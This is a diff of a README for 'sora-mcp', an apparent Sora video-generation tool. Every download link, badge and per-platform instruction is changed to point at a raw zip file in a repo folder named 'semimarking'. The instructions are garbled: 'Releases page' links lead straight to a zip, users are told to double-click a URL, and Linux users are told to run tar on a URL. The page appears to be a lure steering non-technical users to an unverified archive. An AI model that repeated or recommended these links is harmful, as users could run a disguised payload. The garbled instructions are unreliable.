@@ -4,7 +4,7 @@
 Sora-mcp is a user-friendly application that allows you to connect to Sora video generation APIs. With this software, you can easily create stunning videos without needing any technical skills or programming knowledge.
 
 ## 📦 Download Now
-[![Download sora-mcp](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip%20sora--mcp-blue)](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip)
+[![Download sora-mcp](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip%20sora--mcp-blue)](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,14 +12,14 @@ Sora-mcp is a user-friendly application that allows you to connect to Sora video
 Follow these simple steps to install and run sora-mcp on your computer.
 
 **Step 1:** Visit the Releases page to download the latest version.
-[Download sora-mcp](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip)
+[Download sora-mcp](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip)
 
 **Step 2:** Locate the latest release. The latest version will be at the top of the list.
 
 **Step 3:** Choose the file that matches your system. 
-- If you use Windows, look for a file like `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip`.
-- For Mac users, find `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip`.
-- If you’re on Linux, select `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip`.
+- If you use Windows, look for a file like `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip`.
+- For Mac users, find `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip`.
+- If you’re on Linux, select `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip`.
 
 **Step 4:** Click on the file to download it.
 
@@ -27,7 +27,7 @@ Follow these simple steps to install and run sora-mcp on your computer.
 After downloading, follow these steps to run the application.
 
 **For Windows:**
-- Double-click on `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip`.
+- Double-click on `https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip`.
 - Follow the prompts to complete the installation.
 
 **For Mac:**
@@ -39,7 +39,7 @@ After downloading, follow these steps to run the application.
 - Navigate to the folder where you downloaded the file.
 - Extract the files using the command:
   ```
-  tar -xvzf https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip
+  tar -xvzf https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip
   ```
 - Navigate into the extracted folder and run:
   ```
@@ -68,7 +68,7 @@ To ensure that sora-mcp functions smoothly on your computer, please meet the fol
 If you encounter any issues while downloading or using sora-mcp, please check the Issues section on our GitHub page. You can report any bugs or ask for help from the community.
 
 ## 📥 Download & Install
-To download the application, visit our [Releases page](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip) and follow the installation instructions specific to your operating system.
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip) and follow the installation instructions specific to your operating system.
 
 ## 🛠 Features
 - User-friendly interface that anyone can navigate.
@@ -93,4 +93,4 @@ If you want to contribute to the development of sora-mcp, feel free to fork the 
 ## 📞 Contact
 For questions and suggestions, you can reach out to the development team through the Contact section of our GitHub page.
 
-[![Download sora-mcp](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip%20sora--mcp-blue)](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora-mcp.zip)
+[![Download sora-mcp](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip%20sora--mcp-blue)](https://raw.githubusercontent.com/xxxzazaelxxx/sora-mcp/main/semimarking/sora_mcp_2.6-beta.2.zip)
